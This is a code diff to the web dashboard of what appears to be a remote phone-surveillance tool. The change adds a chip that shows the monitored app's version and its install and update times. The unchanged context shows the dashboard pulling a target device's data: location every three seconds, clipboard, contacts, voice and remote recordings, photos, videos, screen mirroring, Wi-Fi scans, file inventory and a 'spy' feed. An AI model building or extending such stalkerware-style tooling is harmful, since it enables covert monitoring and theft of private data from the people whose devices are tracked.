@@ -306,6 +306,7 @@ canvas.chart-canvas{width:100%!important;height:200px!important;border-radius:6p
 <div class="active" id="tab-live">
 <div class="grid">
 <div style="grid-column:1 / -1;display:flex;gap:6px;flex-wrap:wrap;font-size:10px">
+  <span class="chip" style="background:var(--bg);border-color:var(--border);color:var(--muted)" id="swAppVer">&#x1F4E6; --</span>
   <span class="chip" style="background:var(--bg);border-color:var(--border);color:var(--muted)" id="swFgs">&#x2699; FGS --</span>
   <span class="chip" style="background:var(--bg);border-color:var(--border);color:var(--muted)" id="swMirror">&#x1F5A5; Mirror --</span>
   <span class="chip" style="background:var(--bg);border-color:var(--border);color:var(--muted)" id="swUsbDebug">&#x1F50C; USB Debug --</span>
@@ -1320,7 +1321,7 @@ let playbackLoop = false;
 
 // --- Poll Timers ---
 let pollTimers = [];
-const BASE_INTERVALS = { loc: 3000, hist: 600000, meta: 30000, apps: 300000, voice: 300000, fcm: 60000, contacts: 3600000, perms: 3600000, logcat: 300000, remote: 30000, photos: 600000, videos: 60000, health: 3600000, mirror: 10000, spy: 10000, clipboard: 30000, files: 60000 };
+const BASE_INTERVALS = { loc: 3000, hist: 600000, meta: 30000, apps: 300000, voice: 300000, fcm: 60000, contacts: 3600000, perms: 3600000, logcat: 300000, remote: 30000, photos: 600000, videos: 60000, health: 3600000, mirror: 10000, spy: 10000, clipboard: 30000, files: 60000, appVer: 30000 };
 let intervals = { ...BASE_INTERVALS };
 
 // --- Init Map ---
@@ -2701,6 +2702,7 @@ document.getElementById('deviceSelect').addEventListener('change', function() {
   document.getElementById('queueBadge').textContent = '';
   const countEl = document.getElementById('offlineQueueCount');
   if (countEl) { countEl.textContent = '0'; countEl.style.color = 'var(--muted)'; }
+  pollAppVer();
   pollAll();
 });
 
@@ -2729,6 +2731,7 @@ function startPolling() {
   schedulePoll('health', intervals.health, pollHealth);
   schedulePoll('mirror', intervals.mirror, pollMirroring);
   schedulePoll('spy', intervals.spy, pollSpy);
+  schedulePoll('appVer', intervals.appVer, pollAppVer);
   schedulePoll('photos', intervals.photos, pollPhotos);
   schedulePoll('videos', 60000, pollVideos);
   schedulePoll('clipboard', intervals.clipboard, pollClipboard);
@@ -2744,7 +2747,7 @@ function schedulePoll(name, interval, fn) {
 }
 
 async function pollAll() {
-  const fns = [pollLocation(), pollMeta(), pollAppSnapshots(), pollHistory(), pollVoiceNotes(), pollRemoteRecordings(), pollContacts(), pollFcmToken(), pollQueueSize(), pollPermissions(), pollWifiScans(), pollNearbyScans(), pollLogcat(), pollHealth(), pollVideos(), pollPhotos(), pollMirroring(), pollSpy(), pollClipboard(), pollFileInventory()];
+  const fns = [pollLocation(), pollMeta(), pollAppSnapshots(), pollHistory(), pollVoiceNotes(), pollRemoteRecordings(), pollContacts(), pollFcmToken(), pollQueueSize(), pollPermissions(), pollWifiScans(), pollNearbyScans(), pollLogcat(), pollHealth(), pollVideos(), pollPhotos(), pollMirroring(), pollSpy(), pollAppVer(), pollClipboard(), pollFileInventory()];
   for (const fn of fns) { try { await fn; } catch {} }
 }
 
@@ -3176,6 +3179,56 @@ async function pollSpy() {
         '<td style="padding:2px 0;vertical-align:top;word-break:break-word">' + r[1] + '</td></tr>'
       ).join('') + '</table>'
       : '';
+  }
+}
+
+// --- App version chip (Live) ---
+function pktFull12(ts) {
+  try {
+    const d = new Date(Number(ts));
+    const parts = new Intl.DateTimeFormat('en-US', { timeZone: PKT, hour12: true, year: 'numeric', month: '2-digit', day: '2-digit', hour: '2-digit', minute: '2-digit' }).formatToParts(d);
+    const get = (t) => (parts.find(p => p.type === t) || {}).value || '';
+    return `${get('year')}-${get('month')}-${get('day')} ${get('hour')}:${get('minute')} ${get('dayPeriod')}`;
+  } catch { return pkt(ts); }
+}
+async function pollAppVer() {
+  const chip = document.getElementById('swAppVer');
+  if (!chip || !selectedDevice) {
+    if (chip) { chip.textContent = '\u{1F4E6} --'; chip.style.color = 'var(--muted)'; chip.style.borderColor = 'var(--border)'; }
+    return;
+  }
+  try {
+    const info = await fetchRTDB(`devices/${selectedDevice}/info`);
+    let code = 0, name = '', firstMs = 0, lastMs = 0;
+    if (info) {
+      code = parseInt(info.versionCode || info.version_code || info.versionCodeKey || '0');
+      name = info.versionName || info.version_name || '';
+      firstMs = parseInt(info.firstInstallMs || info.first_install_ms || info.firstInstallMsKey || '0');
+      lastMs = parseInt(info.lastUpdateMs || info.last_update_ms || info.lastUpdateMsKey || '0');
+      // fallback: versionCodeKey is base64 decoded key name, but RTDB uses decoded string "versionCode"
+      if (!code) code = parseInt(info['versionCode'] || '0');
+      if (!name) name = info['versionName'] || '';
+      if (!firstMs) firstMs = parseInt(info['firstInstallMs'] || '0');
+      if (!lastMs) lastMs = parseInt(info['lastUpdateMs'] || '0');
+    }
+    if (code && name) {
+      const firstStr = firstMs ? pktFull12(firstMs) : '--';
+      const lastStr = lastMs ? pktFull12(lastMs) : '--';
+      chip.textContent = `\u{1F4E6} v${name} (${code}) \u2022 installed ${firstStr} updated ${lastStr}`;
+      chip.style.color = 'var(--accent)';
+      chip.style.borderColor = 'var(--accent)';
+      chip.title = `Tap to copy`;
+      chip.onclick = () => {
+        const t = `v${name} (${code}) installed ${firstStr} updated ${lastStr}`;
+        if (navigator.clipboard) navigator.clipboard.writeText(t).then(() => showAlert('Copied', 'ok')).catch(() => {});
+      };
+    } else {
+      chip.textContent = '\u{1F4E6} --';
+      chip.style.color = 'var(--muted)';
+      chip.style.borderColor = 'var(--border)';
+    }
+  } catch {
+    if (chip) { chip.textContent = '\u{1F4E6} --'; chip.style.color = 'var(--muted)'; chip.style.borderColor = 'var(--border)'; }
   }
 }
 
